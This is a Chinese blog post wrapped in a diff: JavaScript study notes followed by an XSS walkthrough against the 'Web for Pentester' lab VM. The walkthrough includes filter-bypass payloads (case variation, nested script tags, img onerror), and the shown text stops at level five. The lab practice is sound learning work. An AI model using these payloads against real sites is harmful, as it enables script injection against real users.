@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FJtFPhqPz0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.ydq6.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JS学习">
+<meta property="og:url" content="http://blog.ydq6.com/web/JS%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="gwolfs的个人博客">
+<meta property="og:description" content="前言因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531165807632.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531172849293.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531172939247.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531173008402.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531173119142.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531173157502.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531223835636.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531225745419.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531230254166.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531225902413.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531230641775.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531230929514.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180531231029514.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601000225847.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601143017232.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601142057853.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601144627983.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601144656941.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601144748978.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601145817629.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20180601150140807.png">
+<meta property="article:published_time" content="2020-05-06T14:55:49.000Z">
+<meta property="article:modified_time" content="2020-05-06T15:16:25.488Z">
+<meta property="article:author" content="gwolfs">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="js">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ydq6.com/assets/image-20180531165807632.png">
+
+<link rel="canonical" href="http://blog.ydq6.com/web/JS%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>JS学习 | gwolfs的个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="gwolfs的个人博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">gwolfs的个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/web/JS%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head1.png">
+      <meta itemprop="name" content="gwolfs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gwolfs的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JS学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-06 22:55:49 / 修改时间：23:16:25" itemprop="dateCreated datePublished" datetime="2020-05-06T22:55:49+08:00">2020-05-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。</p>
+<a id="more"></a>
+
+<h2 id="第一章-知识"><a href="#第一章-知识" class="headerlink" title="第一章 知识"></a>第一章 知识</h2><h3 id="1、实现"><a href="#1、实现" class="headerlink" title="1、实现"></a>1、实现</h3><p>（1）要在html中插入js,必须用script标签。浏览器会将script标签中的内容解释为脚本，不会解释为html语言。</p>
+<p>（2）通常把js函数放置到head部分或者body底部，或者把脚本放到外部文件中，用.js命名，在head中用link标签引入脚本或者在标签script中用src引入。</p>
+<h3 id="2、HTML-DOM-文档对象模型"><a href="#2、HTML-DOM-文档对象模型" class="headerlink" title="2、HTML DOM(文档对象模型)"></a>2、HTML DOM(文档对象模型)</h3><p>介绍：可编程对象模型，js能改变页面中所有的html元素和属性、CSS样式，对页面中所有事件作出响应</p>
+<h4 id="2-1、查找html元素"><a href="#2-1、查找html元素" class="headerlink" title="2.1、查找html元素"></a>2.1、查找html元素</h4><p>（1）通过id</p>
+<p>​    document.getElementById()</p>
+<p>（2）通过标签名</p>
+<p>​    document.getElementById().getElementsByTagName()</p>
+<p>（3）通过类名</p>
+<h4 id="2-2、改变HTML"><a href="#2-2、改变HTML" class="headerlink" title="2.2、改变HTML"></a>2.2、改变HTML</h4><p>（1）改变HTML输出流</p>
+<p>​    document.write()</p>
+<p>​    [注]文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</p>
+<p>   (2)改变html内容</p>
+<p>​    document.getElementById().innerHTML</p>
+<p>（3）改变HTML属性</p>
+<p>​    document.getElementById().attribute</p>
+<h4 id="2-3、改变HTML样式"><a href="#2-3、改变HTML样式" class="headerlink" title="2.3、改变HTML样式"></a>2.3、改变HTML样式</h4><p>​    document.getElementById().style.property</p>
+<h4 id="2-4、DOM事件响应"><a href="#2-4、DOM事件响应" class="headerlink" title="2.4、DOM事件响应"></a>2.4、DOM事件响应</h4><p>​    事件：onclick=””</p>
+<p>​    document.getElementById().onclick=</p>
+<h4 id="2-5、改变节点"><a href="#2-5、改变节点" class="headerlink" title="2.5、改变节点"></a>2.5、改变节点</h4><p>（1）增加元素</p>
+<p>​    如需向 HTML DOM 添加新元素，必须首先创建该元素（元素节点），然后向一个已存在的元素追加该元素。</p>
+<p>​    创建元素：document.createElement()</p>
+<p>​    创建文本节点：document.createTextNode()</p>
+<p>​    追加元素：document.getElementById().appendChild()</p>
+<p>（2）删除元素</p>
+<p>​    如需删除 HTML 元素，必须首先获得该元素的父元素。</p>
+<p>​    删除元素：document.getElementById().removeChild()</p>
+<p>​        或 document.getElementById.parentNode.removeChild()</p>
+<h3 id="3、重要语法"><a href="#3、重要语法" class="headerlink" title="3、重要语法"></a>3、重要语法</h3><p>（1）js语句最后要用分号</p>
+<p>（2）js对大小写敏感</p>
+<p>（3）js会忽略多余的空格</p>
+<p>（4）注释：//或/* */</p>
+<p>（5）用var关键词声明变量，变量拥有动态类型</p>
+<h3 id="4、数组"><a href="#4、数组" class="headerlink" title="4、数组"></a>4、数组</h3><p>下标从0开始，三种表示方法：</p>
+<p>（1）var arrays = new Array();</p>
+<p>​    arrays[index];</p>
+<p>（2）var arrays = new Array(“”,””,””);</p>
+<p>（3）var arrays =[“”,””,””];</p>
+<h3 id="5、字符串"><a href="#5、字符串" class="headerlink" title="5、字符串"></a>5、字符串</h3><p>5.1、常用方法：</p>
+<p>（1）new String()创建</p>
+<p>（2）indexOf() 检索字符串</p>
+<p>（3）lastIndexOf()从后向前检索字符串</p>
+<p>（4）replace()替换与正则表达式匹配的子串</p>
+<p>（5）substr()从起始索引号提取字符串中指定数目的字符</p>
+<p>（6）split()把字符串分割为字符串数组</p>
+<p>5.2、常用属性</p>
+<p>（1）length 长度</p>
+<p>（2）prototype</p>
+<h3 id="6、正则表达式"><a href="#6、正则表达式" class="headerlink" title="6、正则表达式"></a>6、正则表达式</h3><p>RegExp</p>
+<h4 id="6-1、定义正则表达式"><a href="#6-1、定义正则表达式" class="headerlink" title="6.1、定义正则表达式"></a>6.1、定义正则表达式</h4><p>​    new RegExp(pattern,attributes);</p>
+<p>​    var patt = new RegExp(“A”);</p>
+<p>attribute:</p>
+<table>
+<thead>
+<tr>
+<th>attribute</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>i</td>
+<td>执行对大小写不敏感匹配</td>
+</tr>
+<tr>
+<td>g</td>
+<td>执行全局匹配（查找所有匹配）</td>
+</tr>
+<tr>
+<td>m</td>
+<td>执行多行匹配</td>
+</tr>
+</tbody></table>
+<h4 id="6-2、方法"><a href="#6-2、方法" class="headerlink" title="6.2、方法"></a>6.2、方法</h4><p>​    test(B)检索字符串B中是否存在与A匹配的,返回true或者false</p>
+<p>​    exec(C)检索字符串C中是否存在与A匹配的，返回值是与A匹配的值</p>
+<p>​    compile()改变检索模式或者添加/删除第二个参数。</p>
+<h4 id="6-3、方括号"><a href="#6-3、方括号" class="headerlink" title="6.3、方括号"></a>6.3、方括号</h4><ul>
+<li>用于查找某个范围内的字符</li>
+<li>[abc]查找方括号之间的任何字符</li>
+<li>[^abc]查找任何不在方括号之间的字符</li>
+<li>[0-9]查找任何从0至9的数字</li>
+<li>[a-z]查找从a到z的字符</li>
+<li>[A-z]查找从A到z的字符 //注意A的ASCII码比a的小</li>
+</ul>
+<h4 id="6-4、量词"><a href="#6-4、量词" class="headerlink" title="6.4、量词"></a>6.4、量词</h4><ul>
+<li>n+ 匹配任何包含至少一个n的字符串</li>
+<li>n*匹配任何包含零个或多个n的字符串</li>
+<li>n?匹配任何包含零个或一个n的字符串</li>
+<li>^n匹配任何开头为n的字符串</li>
+<li>n$匹配任何结尾为n的字符串</li>
+</ul>
+<h3 id="7、JS-windows"><a href="#7、JS-windows" class="headerlink" title="7、JS windows"></a>7、JS windows</h3><p>所有浏览器都支持 <em>window</em> 对象。它表示浏览器窗口。</p>
+<p>所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。</p>
+<h4 id="7-1、浏览器窗口尺寸"><a href="#7-1、浏览器窗口尺寸" class="headerlink" title="7.1、浏览器窗口尺寸"></a>7.1、浏览器窗口尺寸</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w=<span class="built_in">window</span>.innerWidth</span><br><span class="line">|| <span class="built_in">document</span>.documentElement.clientWidth</span><br><span class="line">|| <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> h=<span class="built_in">window</span>.innerHeight</span><br><span class="line">|| <span class="built_in">document</span>.documentElement.clientHeight</span><br><span class="line">|| <span class="built_in">document</span>.body.clientHeight;</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-2、screen对象"><a href="#7-2、screen对象" class="headerlink" title="7.2、screen对象"></a>7.2、screen对象</h4><p>包含有关用户屏幕的信息</p>
+<p>availWidth可用的屏幕宽度</p>
+<p>availHeight可用的屏幕高度</p>
+<h4 id="7-3、location对象"><a href="#7-3、location对象" class="headerlink" title="7.3、location对象"></a>7.3、location对象</h4><p>location对象用于获得当前页面的地址 (URL)</p>
+<p>（1）hostname返回web主机的域名</p>
+<p>（2）pathname返回当前页面的路径和文件名</p>
+<p>（3）port 返回web主机的端口</p>
+<p>（4）protocol返回所使用的web协议</p>
+<p>（5）assign()加载新文档</p>
+<h4 id="7-4、Navigator对象"><a href="#7-4、Navigator对象" class="headerlink" title="7.4、Navigator对象"></a>7.4、Navigator对象</h4><p>该对象包含有关访问者浏览器的信息。</p>
+<p>[注]来自 navigator 对象的信息具有误导性，不应该被用于检测浏览器版本，navigator数据可被浏览器使用者更改</p>
+<p>（1）appCodeName 浏览器代码名</p>
+<p>（2）appName 浏览器的名称</p>
+<p>（3）appVersion 浏览器的平台和版本信息</p>
+<p>（4）cookieEnabled浏览器是否启用cookie</p>
+<p>（5）platform浏览器运行的操作系统平台</p>
+<p>（6）userAgent客户机发送给服务器的user-agent头</p>
+<p>（7）systemLanguage客户机指定的系统语言</p>
+<h4 id="7-5、windows对象"><a href="#7-5、windows对象" class="headerlink" title="7.5、windows对象"></a>7.5、windows对象</h4><p>（1）location </p>
+<p>（2）name 设置或返回窗口的名称</p>
+<p>（3）status设置窗口状态栏的文本</p>
+<p>（4）close()关闭浏览器窗口</p>
+<p>（5）alert()弹出警告框</p>
+<p>（6）confirm()弹出确认框</p>
+<p>（7）prompt()弹出输入框</p>
+<p>（8）open(“URL”,”窗口名称”,”窗口风格”) 打开一个新窗口</p>
+<h3 id="8、函数"><a href="#8、函数" class="headerlink" title="8、函数"></a>8、函数</h3><h4 id="8-1、定义声明"><a href="#8-1、定义声明" class="headerlink" title="8.1、定义声明"></a>8.1、定义声明</h4><p>函数声明：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="keyword">function</span><span class="constructor">Name(<span class="params">parameters</span>)</span>&#123;</span><br><span class="line"><span class="comment">//code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数表达式：</p>
+<p>JavaScript 函数可以通过一个表达式定义，函数表达式可以存储在变量中。在函数表达式存储在变量后，变量也可作为一个函数使用：</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="function"><span class="keyword">function</span><span class="params">(parameters)</span></span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> z = x(parameters);</span><br></pre></td></tr></table></figure>
+
+<p>function构造函数</p>
+<p>函数同样可以通过内置的 JavaScript 函数构造器（Function()）定义。</p>
+<h4 id="8-2、参数"><a href="#8-2、参数" class="headerlink" title="8.2、参数"></a>8.2、参数</h4><p>参数规则：</p>
+<p>函数定义时参数没有指定数据类型</p>
+<p>如果函数在调用时缺少参数，参数会默认设置为undefined</p>
+<p>js函数参数是值传递，对象是引用传递。</p>
+<p>Arguments对象</p>
+<p>js函数都有个内置的对象arguments。该对象包含了函数调用的参数数组。</p>
+<h4 id="8-3、调用"><a href="#8-3、调用" class="headerlink" title="8.3、调用"></a>8.3、调用</h4><p>this关键字指向函数执行时的当前对象。</p>
+<p>当函数没有被自身的对象调用时， <strong>this</strong> 的值就会变成全局对象，全局变量属于windows对象。如果函数是对象中的一个方法时，this的值就会变为对象。</p>
+<h4 id="8-4、闭包"><a href="#8-4、闭包" class="headerlink" title="8.4、闭包"></a>8.4、闭包</h4><p>函数既可以访问该函数内部定义的变量又可访问该函数外部定义的变量。</p>
+<p>全局变量的作用域是全局性的，局部变量只能用于定义它函数内部。</p>
+<p>内嵌函数plus可以访问父函数的变量而不是访问当前函数的变量（用在父函数和当前函数有同名变量时）</p>
+<h2 id="第二章-实战"><a href="#第二章-实战" class="headerlink" title="第二章 实战"></a>第二章 实战</h2><h3 id="1、XSS（跨站脚本攻击）"><a href="#1、XSS（跨站脚本攻击）" class="headerlink" title="1、XSS（跨站脚本攻击）"></a>1、XSS（跨站脚本攻击）</h3><h4 id="1-1、实验环境"><a href="#1-1、实验环境" class="headerlink" title="1.1、实验环境"></a>1.1、实验环境</h4><p>虚拟机：web for pentester</p>
+<p>iso下载地址</p>
+<p><a href="https://pentesterlab.com/exercises/web_for_pentester/iso" target="_blank" rel="noopener">https://pentesterlab.com/exercises/web_for_pentester/iso</a></p>
+<h4 id="1-2、第一关"><a href="#1-2、第一关" class="headerlink" title="1.2、第一关"></a>1.2、第一关</h4><p><a href="http://192.168.1.114/xss/example1.php?name=hacker" target="_blank" rel="noopener">http://192.168.1.114/xss/example1.php?name=hacker</a></p>
+<p><img src="/assets/image-20180531165807632.png" alt="image-20180531165807632"></p>
+<p>可以看出是将name的参数显示在屏幕上。</p>
+<p>用js语言alert(‘flag’)直接弹出flag</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example1.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>直接弹出flag</p>
+<h4 id="1-3、第二关"><a href="#1-3、第二关" class="headerlink" title="1.3、第二关"></a>1.3、第二关</h4><p>先继续尝试alert(‘flag’)</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example2.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>发现不弹框，应该script标签被过滤</p>
+<p>回顾基础知识，html的标签对大小写不敏感</p>
+<p>尝试用</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example2.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>正确弹框</p>
+<h4 id="1-4、第三关"><a href="#1-4、第三关" class="headerlink" title="1.4、第三关"></a>1.4、第三关</h4><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531172849293.png" alt="image-20180531172849293"></p>
+<p>没用，看来大小写均被过滤了。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hackerscript</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531172939247.png" alt="image-20180531172939247"></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=hacker<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531173008402.png" alt="image-20180531173008402"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hacker&lt;script1&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531173119142.png" alt="image-20180531173119142"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example3.php?name=hacker&lt;<span class="number">1</span>script1&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531173157502.png" alt="image-20180531173157502"></p>
+<p>猜想可能是基于&lt;script前缀为匹配的，</p>
+<p>用下面方法：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example3.php<span class="built_in">?name</span>=&lt;scri<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">pt&gt;alert(<span class="string">"flag"</span>)&lt;/sc</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>ript&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤掉了script后生下来的字符组成script，成功绕过。</p>
+<h4 id="1-5、第四关"><a href="#1-5、第四关" class="headerlink" title="1.5、第四关"></a>1.5、第四关</h4><p>继续输入</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example4.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>没弹框，再次过滤了。</p>
+<p>而且显示：</p>
+<p><img src="/assets/image-20180531223835636.png" alt="image-20180531223835636"></p>
+<p>试一下其他的：</p>
+<p><a href="http://192.168.1.114/xss/example4.php?name=script" target="_blank" rel="noopener">http://192.168.1.114/xss/example4.php?name=script</a></p>
+<p>又报error，其他字符则正常显示，看来是出现script字符就会爆报error</p>
+<p>换一下其他标签试试</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example4.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">'alert('</span>flag<span class="string">')'</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不能弹出，为什么呢？想一下是单引号中里面还有单引号，语法错误。</p>
+<p>换为：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example4.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">"alert('flag')"</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功弹出，看来只是对script报错</p>
+<h4 id="1-6、第五关"><a href="#1-6、第五关" class="headerlink" title="1.6、第五关"></a>1.6、第五关</h4><p>试下普通的</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531225745419.png" alt="image-20180531225745419"></p>
+<p>又报错。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=&lt;img src=<span class="string">"112321312"</span> onerror=<span class="string">"alert('flag')"</span><span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>也报错。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=&lt;img src=<span class="string">"112321312"</span> <span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531230254166.png" alt="image-20180531230254166"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.114</span><span class="regexp">/xss/</span>example5.php?name=script</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20180531225902413.png" alt="image-20180531225902413"></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">1.114</span>/xss/example5.php<span class="built_in">?name</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span></span><br></pre></td></tr></table></figure>
+
